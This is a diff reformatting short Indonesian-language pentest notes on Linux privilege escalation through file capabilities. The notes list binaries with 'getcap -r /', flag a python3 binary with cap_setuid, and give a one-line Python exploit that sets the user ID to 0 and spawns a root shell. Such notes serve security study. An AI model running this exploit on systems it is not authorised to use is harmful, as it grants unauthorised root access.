@@ -1,8 +1,17 @@
 cek hak Capabilities
 
-getcap -r / 
+## Cek Hak Sudo
 
-hasilnya 
+```bash
+getcap -r /
+```
+Perhatikan entry seperti:
+
+```text
 /usr/bin/python3.11 cap_setuid=ep
+```
+## Contoh Eksploitasi
 
-python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'  # Python
+```bash
+python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'  # Python 
+```
